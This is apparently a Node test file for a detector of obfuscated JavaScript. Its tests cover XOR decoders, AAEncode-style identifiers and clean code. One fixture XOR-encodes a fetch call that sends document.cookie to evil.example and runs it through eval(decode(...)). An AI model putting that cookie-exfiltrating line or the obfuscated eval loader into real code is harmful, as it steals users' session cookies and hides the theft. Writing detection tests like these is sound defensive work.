import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import { analyzeEncoded } from '../src/analyzers/encoded';
import { parseCode } from '../src/parser';

function findingsFor(src: string) {
  return analyzeEncoded(parseCode(src, 'inline.js'), 'inline.js');
}

test('encoded: XOR decoder with literal args → recovers plaintext into the finding', () => {
  // Build a real XOR-encoded payload at test time so we know the ciphertext.
  const plain = 'fetch("https://evil.example/exfil?d=" + document.cookie)';
  const key   = 'k3y!';
  let ct = '';
  for (let i = 0; i < plain.length; i++) {
    ct += String.fromCharCode(plain.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  // Escape the ciphertext for embedding in JS source — use JSON.stringify.
  const ctLit  = JSON.stringify(ct);
  const keyLit = JSON.stringify(key);
  const src = `
    function decode(s, k) {
      let out = '';
      for (let i = 0; i < s.length; i++)
        out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
      return out;
    }
    eval(decode(${ctLit}, ${keyLit}));
  `;

  const f = findingsFor(src);
  const xorFinding = f.find(x => /XOR decoder/.test(x.message));
  assert.ok(xorFinding, `expected XOR decoder finding, got: ${JSON.stringify(f)}`);
  // The recovered plaintext should appear in the message.
  assert.ok(xorFinding.message.includes('fetch'),
    `recovered plaintext should mention "fetch"; got: ${xorFinding.message}`);
});

test('encoded: XOR decoder with NON-literal args is not flagged with recovery', () => {
  // The decoder is present but the call uses runtime values.
  const src = `
    function decode(s, k) {
      let out = '';
      for (let i = 0; i < s.length; i++)
        out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
      return out;
    }
    decode(window.payload, window.key);
  `;
  const f = findingsFor(src);
  // No XOR recovery finding (can't statically compute it).
  assert.equal(f.filter(x => /XOR decoder/.test(x.message)).length, 0);
});

test('encoded: AAEncode-style katakana density triggers a finding', () => {
  // Synthetic: 6 distinct katakana identifiers + a couple of string lits.
  const src = `
    var ﾟωﾟ = 1, ﾟДﾟ = 2, ｦｧｨ = 3, ｮｯｰ = 4, ﾝﾞ = 5;
    function ﾟｰﾟ() { return "ﾝﾟﾞ"; }
  `;
  const f = findingsFor(src);
  assert.ok(f.some(x => /AAEncode/.test(x.message)),
    `expected AAEncode finding, got: ${JSON.stringify(f)}`);
});

test('encoded: clean code produces no encoded-family findings', () => {
  const src = `
    function add(a, b) { return a + b; }
    const result = add(1, 2);
    console.log(result);
  `;
  assert.equal(findingsFor(src).length, 0);
});
